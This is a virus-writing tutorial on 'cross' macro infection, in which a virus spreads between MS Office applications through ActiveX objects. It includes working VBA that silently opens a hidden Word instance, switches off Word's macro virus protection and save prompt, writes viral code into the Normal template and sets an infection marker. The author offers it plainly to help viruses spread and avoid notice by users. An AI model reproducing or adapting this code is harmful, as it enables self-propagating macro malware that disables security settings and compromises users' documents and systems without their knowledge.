.Introduction to cross macros</b>

    Cross application infections,  known from binary viruses we are able to
infect for  example from one office  application to another one. If a virus
is able to  jump from one application to  another we call it cross.  It's a
good idea to use the cross idea, because it helps your virus to survive.

    Jumping from one  application to another  gives the virus  more control
over the user's applications.  Cross applications can infect two or more MS
Office applications and are that way more resisdent and harder to clean.

<b>
.The 'Cross macro' basics</b>

    First you have to know that it is possible to  jump across nearly every
MS Office application except for Access. I am not sure about Access ;) Well
for our cross infection it is the best way to use ActiveX communication be-
tween the applications. Our possible classes for ActiveX are:

 - Word.Application
 - Excel.Application
 - PowerPoint.Application
 - MSProject.Application

    To use this you use the CreateObject or GetObject command in VBA or VBS
to get an ActiveX communication with the choosen application.  CreateObject
would open a new application  hidden by default which we have to quit after
infection and GetObject would use a allready opened application and use it.
Once you opened an ActiveX communication you can use it like you code in an
application you want to infect. Just put the object variable infront and do
coding. ;) To understand what I mean read on in the next section.


<b>.Cross infection technics</b>

     I am not going to explain here any other technic than ActiveX technic,
because the other ones are too  complicated and to obviously for a possible
infection. Well, first is it a good idea to make some marker that tells you
if have already  infected an application  cross on a computer.  For example
let your virus drop a file with the name 'word.inf' to tell your virus that
it has  already infected Word cross.  Well this is just an example  how you
let the virus check. Another one could be writing in an .ini file or change
the username of an application to get a marker.  All together, it is not so
good to cross infect the applications everytime the virus gets executed. It
would be too suspecious for the user,  but it is your decision. Ok, we have
cleared this yet and now we are talking about the infection method. The po-
ssibilities we have are to check if the applicaton we want to infect is al-
ready open and infect it or if we make a hidden  Active X object and try to
infect the application behind the users back in the background ;) 

    Ok, now to start our working cross infection, use this command to check
for an already active Word application. 

 Set CrossObj = GetObject(,"Word.Application")

    As you see we set the active Word application into the variable 'Cross-
Obj'. So we suppose now that Word is active but for the case that it is not
we should check it and if not we should create a new Active X communication
with Word.

 If CrossObj = "" Then 
  Set CrossObj = CreateObject("Word.Application")
  QuitObj = True
 End If

    Here we check if the application is open and if not we create a new one
hidden in the background and of course we need to quit it after that. So we
set a variable to the value true that  we later can check if we created one
or if it was already present. If the application you want to infect was not
active,  it is very important to quit it after  infection or it will remain
running. To quit the application just simple use the following.

 If QuitObj = True Then CrossObj.Quit

    As you see, if the variable is true we quit the hidden application. Now
we take a look on the basic infection of a Word 97 through the cross method
using Active X.

 Set CrossObj = GetObject(,"Word.Application")

 If CrossObj = "" Then
  Set CrossObj = CreateObject("Word.Application")
  QuitObj = True
 End If

 If CrossObj.Application.UserName &lt;&gt; "Infected" Then 

  CrossObj.Application.UserName = "Infected"

  CrossObj.Options.VirusProtection = False
  CrossObj.Options.SaveNormalPrompt = False

  CrossObj.NormalTemplate.VBProject.VBComponents(1) _
   .CodeModule.AddFromString VirusCode
 
  CrossObj.NormalTemplate.Save

  If QuitObj = True Then CrossObj.Quit

 End If

    This is a very simple example of a cross infection of Word. I will talk
a bit about the single commands.  Well, first try to get an Active X object
of an already open Word.  If there is no open Word create  a new one in the
background an set the variable that checks for quitting.  For our infection
marker we use the username of the application, we check for it and if it is
unequal we do  the following steps.  First we set our marker,  then disable
the build in virus protection of Word  and disable the prompting for saving
the template of Word.  After that we insert our  viral code into  the class
object section of the  default Word template 'NormalTemplate'.  Finally try
to save it and if we where forced to create a hidden object we quit it. Ok,
this routine is nearly the same when you infect for example Excel or Power-
Point, etc. Just do a  few changes on the infection  technic and a  it is a
good idea to infect for example the recent files of  the cross application.
All in all, cross infection is a  nice technic to give  your virus a better
spreading base.  So that's the little I want to explain you about cross in-
fection and I am sure you can figure out the rest when there is one...;)
